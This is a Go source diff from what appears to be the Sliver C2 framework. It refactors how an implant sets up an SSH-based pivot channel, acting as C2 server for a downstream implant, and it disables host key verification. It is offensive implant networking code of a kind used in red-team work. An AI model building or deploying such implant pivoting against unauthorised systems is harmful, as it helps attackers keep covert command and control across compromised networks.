@@ -23,8 +23,10 @@ import (
 	"log"
 	// {{end}}
 
+	"errors"
 	"io"
 	"net"
+	"sync"
 
 	"github.com/golang/protobuf/proto"
 	"golang.org/x/crypto/ssh"
@@ -32,8 +34,58 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
-// SetupPivot - The Comm prepares SSH code and security details, depending on our position (pivot or not).
-func (comm *Comm) SetupPivot(key []byte) (err error) {
+// InitPivot - Same as Init(), but used when the implant is handling a pivoted implant connection.
+func InitPivot(conn net.Conn, key []byte) (sessionStream io.ReadWriteCloser, err error) {
+	// Return if we don't have what we need.
+	if conn == nil {
+		return nil, errors.New("net.Conn is nil, cannot init Comm")
+	}
+
+	// New SSH multiplexer Comm
+	comm := &Comm{mutex: &sync.RWMutex{}}
+
+	// Pepare the SSH conn/security, and set keepalive policies/handlers.
+	err = comm.setupAuthPivot(key)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to setup SSH client connection: %s", err.Error())
+		// {{end}}
+		return nil, err
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Initiating SSH client connection...")
+	// {{end}}
+
+	// We act as the C2 server here.
+	comm.sshConn, comm.inbound, comm.requests, err = ssh.NewServerConn(conn, comm.serverConfig)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to initiate SSH connection: %s", err.Error())
+		// {{end}}
+		return
+	}
+
+	go comm.serveRequests() // Serve pings & requests with keepalive policies
+	comm.checkLatency()     // Get latency for this tunnel.
+
+	// Get a stream for the session, if not through a tunnel.
+	sessionStream, err = comm.initSessionPivot()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to setup C2 stream: %s", err.Error())
+		// {{end}}
+		return
+	}
+
+	Comms.Add(comm)                // Everything is up and running, register the mux.
+	go comm.handleServerIncoming() // Handle requests (pings) and incoming connections in the background.
+
+	return
+}
+
+// setupAuthPivot - The Comm prepares SSH code and security details as if we were the server.
+func (comm *Comm) setupAuthPivot(key []byte) (err error) {
 
 	// Encryption & authentication
 	signer, err := ssh.ParsePrivateKey(key)
@@ -46,64 +98,15 @@ func (comm *Comm) SetupPivot(key []byte) (err error) {
 
 	comm.clientConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
 	comm.clientConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()
-	// m.clientConfig.HostKeyCallback = ssh.FixedHostKey(signer.PublicKey()) // Does not match server key
 
 	// Keep-alives and other
 
 	return
 }
 
-// InitPivot - Same as Init(), but used when the implant is handling a pivoted implant connection.
-func (m *Comm) InitPivot(conn net.Conn, key []byte) (sessionStream io.ReadWriteCloser, err error) {
-	// {{if .Config.Debug}}
-	log.Printf("Initiating SSH client connection...")
-	// {{end}}
-
-	// Pepare the SSH conn/security, and set keepalive policies/handlers.
-	// err = m.Setup(true, key)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("failed to setup SSH client connection: %s", err.Error())
-		// {{end}}
-		return nil, err
-	}
-
-	// We act as the C2 server here.
-	m.sshConn, m.inbound, m.requests, err = ssh.NewServerConn(conn, m.serverConfig)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("failed to initiate SSH connection: %s", err.Error())
-		// {{end}}
-		return
-	}
-
-	// Serve pings & requests with keepalive policies, the same way for pivots or not.
-	go m.serveRequests()
-
-	// Get latency for this tunnel.
-	m.checkLatency()
-
-	// Get a stream for the session, if not through a tunnel.
-	sessionStream, err = m.initSessionPivot()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("failed to setup C2 stream: %s", err.Error())
-		// {{end}}
-		return
-	}
-
-	// Everything is up and running, register the mux.
-	Comms.Add(m)
-
-	// Handle requests (pings) and incoming connections in the background.
-	go m.serveActiveConnection()
-
-	return
-}
-
 // initSessionPivot - We act as the C2 server by requiring a stream, but in turn we give it back to the server.
-func (m *Comm) initSessionPivot() (stream io.ReadWriteCloser, err error) {
-	if m.sshConn == nil {
+func (comm *Comm) initSessionPivot() (stream io.ReadWriteCloser, err error) {
+	if comm.sshConn == nil {
 		// {{if .Config.Debug}}
 		log.Printf("Tried to open channel on nil SSH connection")
 		// {{end}}
@@ -111,7 +114,7 @@ func (m *Comm) initSessionPivot() (stream io.ReadWriteCloser, err error) {
 	}
 	info := &sliverpb.ConnectionInfo{ID: "REGISTRATION"}
 	data, _ := proto.Marshal(info)
-	dst, reqs, err := m.sshConn.OpenChannel("session", data)
+	dst, reqs, err := comm.sshConn.OpenChannel("session", data)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to open Session RPC channel: %s", err.Error())
